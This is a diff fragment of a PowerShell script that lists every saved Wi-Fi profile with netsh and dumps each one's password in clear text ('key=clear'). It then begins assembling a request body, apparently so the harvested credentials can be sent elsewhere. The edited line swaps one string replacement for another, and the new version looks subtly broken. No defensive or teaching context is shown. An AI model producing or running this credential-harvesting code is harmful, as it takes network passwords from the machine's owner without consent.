@@ -2,7 +2,7 @@ netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEac
     $wlan  = $_.Matches.Value
     $prof = netsh wlan show profile $wlan key=clear
 	ForEach ($line in $prof) {
-		$line = $line -replace '\r\n', ' '
+		$line = $line.replace('\s','\n')
 	}
 
 	$Body = @{
